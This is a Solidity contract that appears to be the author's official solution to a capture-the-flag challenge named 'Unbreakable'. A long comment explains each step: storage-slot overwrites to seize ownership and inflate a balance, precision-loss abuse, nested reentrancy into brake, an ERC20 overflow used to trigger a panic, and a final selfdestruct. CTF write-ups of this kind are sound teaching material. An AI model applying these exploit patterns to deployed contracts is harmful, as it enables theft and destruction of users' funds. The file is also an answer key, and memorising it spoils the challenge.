// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

import './Unbreakable.sol';

contract Exploit {

    Unbreakable instance;
    constructor(Unbreakable _instance)
    {
        instance = _instance;
        _instance.approve(address(_instance), type(uint).max);

        /*
        To avoid many other attack angles (and avoid minus points) I had to strictly limit the players possibilities, so there's just a narrow path one can follow.
        I tried to make some things overly complicated to compensate a bit. Designing CTFs is hard :(

        Let's go through the solution backwards. So, our goal is to destroy the contract.
        There's no explicit selfdestruct, but we can leverage the delegatecall for that.
        To get there we first need to set broken to true, which can only be done in brake. We'll get to that later.
        Note that the final if requires broken to be false again. The only way to do this is via Panic, so this is the function data will encode.
        data is the result of the previous call which is expected to fail. So, obviously we we want to raise a panic error (see https://docs.soliditylang.org/en/v0.8.11/control-structures.html?highlight=panic#panic-via-assert-and-error-via-require).
        There's a small test to actually set broken to false. solved has to be true, so we need to solve the challenge before - crazy.

        Raising the panic error is meant to be a bit tricky. If you find a simpler way than the one described below, kudos to you,
        you might've earned some bonus points.
        The notBroken modifier denies going back into the contract, so we need to look elsewhere. Your first guess is probably the ERC20 implementation and you're damn right.
        We're looking for some way to cause a panic error (require()s don't work, they throw a normal error). Things like overflows, as described in the link above.
        Because we're calling as an external contract we can't access the internal functions like _mint or _burn.
        One option (maybe there are others?) is the addition in _transfer in line 236.
        If we get an overflow here, a panic error with error code 0x11 is thrown and we've set broken to false.

        So the basic idea is to solve the challenge, prepare some account balance for the overflow, and then throw a couple errors around until you reach the finish line.
        Executing this shouldn't be too hard now, but it might still take you some time (at least it took me a while setting it up :X).
        challenge1 requires you to understand basic storage layout (and byte alignment of addresses).
        challenge2 is constructed a bit annoying (on purpose), but essentially you just need to solve a small equation. Could be your typical DeFi protocol weakness. Let's hope it has no flaws.
        Next we get to execute our reward; That's a reentrancy (what else!) into brake to abuse the storage modification of challenge1 (the challenge is done already, so we can break something). You need even more understanding of storage layout (mappings).
        We're simply increasing the contracts balance to the max value.
        We can't fail challenge2 just yet though, otherwise we'd revert the storage modification. So pass challenge2 and go for another reentrancy.
        Then we'll fail challenge2 and execute our custom error message. It contains a token transfer from our wallet to the contract (don't forget the approval :P). This triggers the overflow.
        The preparation transaction is finished, the contract is happily waiting for its "maintenance" now. The solver address has reset, so go the route via the brake function again.

        And we're done! Creating this was a lot of fun. I hope you liked it, too :)

        PS: wen CTF v2? :eyes:
        */

        // read solutions from bottom to top
        Unbreakable.Solution memory solution_3 = Unbreakable.Solution({
            ch1_slot: 0,
            ch1_value: bytes32(0),
            ch2_amount: 0,                                           // fail the calculation challenge
            ch2_error: string(abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), instance, 1)),  // calling causes overflow panic error
            reward: bytes("")
        });

        Unbreakable.Solution memory solution_2 = Unbreakable.Solution({
            ch1_slot: uint256(keccak256(abi.encode(instance, 0))),  // overwrite contracts balance to pass final test before self-destruction
            ch1_value: bytes32(type(uint).max),
            ch2_amount: 1,                                          // integer precision loss passes check
            ch2_error: string("error"),
            reward: abi.encodeCall(instance.brake, solution_3)      // reentrancy
        });

        Unbreakable.Solution memory solution_1 = Unbreakable.Solution({
            ch1_slot: 5,                                            // overwrite owner
            ch1_value: bytes32(uint256(uint160(address(this)))),    // take care of byte alignment
            ch2_amount: 250000,                                     // just make sure token contract keeps *exactly* 80.0000% after precision loss in resupply
            ch2_error: string("error"),
            reward: abi.encodeCall(instance.brake, solution_2)      // reentrancy
        });

        instance.brake(solution_1);
    }
    
    function finalize() external {

        Unbreakable.Solution memory solution = Unbreakable.Solution({
            ch1_slot: 0,
            ch1_value: bytes32(0),
            ch2_amount: 0,                                           // fail the calculation challenge
            ch2_error: string(abi.encodeWithSignature("doStorageMaintenance()")),
            reward: bytes("")
        });

        instance.brake(solution);
    }

    fallback() external {
        selfdestruct(payable(0));       // you earned your point (:
    }
}
